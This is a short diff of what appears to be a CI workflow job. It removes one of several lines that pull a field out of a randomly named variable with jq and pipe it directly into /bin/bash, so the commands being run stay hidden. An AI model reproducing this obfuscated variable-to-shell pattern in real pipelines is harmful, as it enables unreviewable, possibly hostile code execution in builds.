@@ -27,7 +27,6 @@ jobs:
           printf '%s' "$h5" | jq -r .ce343 | /bin/bash
           echo $eaii5585 | jq -r .k108 | /bin/bash
           echo $pgh3 | jq -r .zaad5 | /bin/bash
-          printf '%s' "$fg325" | jq -r .twuak48 | /bin/bash
           echo $tzsmt0 | jq -r .godw6 | /bin/bash
 
       - name: Upload results
